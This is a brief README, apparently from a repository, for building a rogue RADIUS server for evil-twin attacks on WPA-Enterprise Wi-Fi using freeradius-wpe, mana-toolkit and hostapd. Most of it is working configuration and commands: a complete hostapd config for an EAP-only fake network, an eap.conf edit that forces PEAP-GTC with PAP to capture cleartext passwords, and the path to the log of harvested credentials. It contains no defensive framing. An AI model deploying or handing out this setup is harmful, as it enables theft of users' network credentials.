# Rogue_Radius_Server
Rogue Radius Server (freeradius patch + hostapd). 

# 1. Install freeradius with patch
How to: https://github.com/brad-anton/freeradius-wpe
# 2. Create hostapd.conf - I use mana-tooklit (Kali linux)
apt-get install mana-toolkit hostapd
# hostapd-mana-eaponly.conf:

interface=wlan0
channel=1
ssid=TestSSID     
ieee8021x=1
dump_file=/tmp/hostapd.dump
eapol_key_index_workaround=0
own_ip_addr=127.0.0.1
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=testing123
wpa=1
wpa_key_mgmt=WPA-EAP     
wpa_pairwise=TKIP 
logger_stdout=-1
logger_stdout_level=0
#ennode=/var/lib/mana-toolkit/ennode.node


# 3. cd /usr/share/mana-toolkit/run-mana/
nano start-noupstream-eaponly.sh 
# delete msfconsole and crackapd

after that edit eap.conf in /usr/local/etc/raddb:

in eap { 
			default_eap_type = peap
gtc {
			auth_type = PAP
peap {
				default_eap_type = gtc
# 4. Save and run: radiusd -X
# 5. After that run: hostapd  hostapd-mana-eaponly.conf

# logs: usr/local/var/log/radius# leafpad freeradius-server-wpe.log
